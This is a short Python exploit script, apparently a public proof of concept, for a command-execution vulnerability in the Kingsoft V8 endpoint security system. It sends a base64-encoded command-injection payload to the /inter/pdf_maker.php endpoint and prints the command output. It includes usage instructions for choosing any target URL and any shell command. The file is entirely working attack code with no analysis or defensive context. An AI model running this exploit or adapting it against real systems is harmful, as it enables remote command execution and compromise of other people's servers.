import requests
import base64
import sys


def title():
    print('+------------------------------------------')
    print('+  \033[34mAuthor: Y5neKO\033[0m')
    print('+  \033[34mGithub: https://github.com/Y5neKO\033[0m')
    print('+  \033[34mBlog: https://blog.ysneko.com\033[0m')
    print('+  \033[34mTitle: 金山V8终端安全系统 命令执行漏洞\033[0m')
    print('+  \033[36m使用格式:  python3 exp.py {url} {cmd}\033[0m')
    print('+  \033[36mUrl格式:  >>> http://example.com\033[0m')
    print('+------------------------------------------')


def rce():
    title()
    url = sys.argv[1] + "/inter/pdf_maker.php"
    cmd_start = '"|| echo HOME & echo Request: & echo -------------------- & '
    cmd_end = ' & echo -------------------- & echo END ||'
    cmd = cmd_start + sys.argv[2] + cmd_end
    cmd2 = cmd.encode()
    cmd_b64 = base64.b64encode(cmd2).decode()
    post = {'url': cmd_b64, 'fileName': 'xxx'}
    r = requests.post(url, data=post)
    r.encoding = 'gbk'      # 对requests结果进行编码防止中文乱码，按照shell支持编码进行调整
    output = r.text
    a, b = output.find('HOME'), output.find('END')
    print(output[a + 5:b], )


if __name__ == '__main__':
    if len(sys.argv) == 3:
        rce()
    else:
        title()
